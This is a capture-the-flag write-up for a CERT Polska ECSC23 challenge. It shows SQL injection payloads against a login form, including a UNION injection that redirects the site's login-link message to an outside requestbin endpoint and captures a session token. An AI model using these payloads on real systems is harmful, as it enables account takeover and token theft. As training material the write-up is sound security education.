# e-PUŁAP

> Passwords? You mean those weird cryptic strings from the XX century? Not gonna find them in our brand new e-PUŁAP service website!
>
> https://e-pulap.ecsc23.hack.cert.pl/

## Solution
The form on the login website is vulnerable to SQL injection. After sending `' or '1'='1`, one can see an error:
```
error:Could not resolve host: chat.evil-corporation.private
```
However, using `' union select '1`, results in another error:
```
Fatal error: Uncaught PDOException: SQLSTATE[42601]: Syntax error: 7 ERROR: each UNION query must have the same number of columns LINE 1: ...ok_login_url FROM users WHERE username = '' union select '1' ^ in /var/www/html/login.php:47 Stack trace: #0 /var/www/html/login.php(47): PDO->query('SELECT username...') #1 {main} thrown in
/var/www/html/login.php
on line
47
```
It seems that the query selects an username and an url. After creating an endpoit using e.g. requestbin and passing the following value in the form: `' union select '1', '' union select '1', '[endpoint url]`, we receive a POST HTTP request with the following form data:
```
--------------------------b137f5c0191aade6
Content-Disposition: form-data; name="text"

TwÃ³j link do logowania do strony sieciowej e-PUÅAP to https://e-pulap.ecsc23.hack.cert.pl/login.php?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMSIsImV4cCI6MTY5MDIwODA2NCwiaXNzIjoibG9jYWxob3N0IiwiaWF0IjoxNjkwMjA0NDY0fQ.0K8DJuiwyJ1Gu1PgAiRTE61-1a749vzghbIRk_7H8J8
--------------------------b137f5c0191aade6--
```
This url redirects to a website with some quality memes and the flag.

![kofeina](media/kofeina.png)
![okladka](media/okladka.png)
![shellcode](media/shellcode.png)

## Flag
`ecsc23{paswordless_is_the_future!}`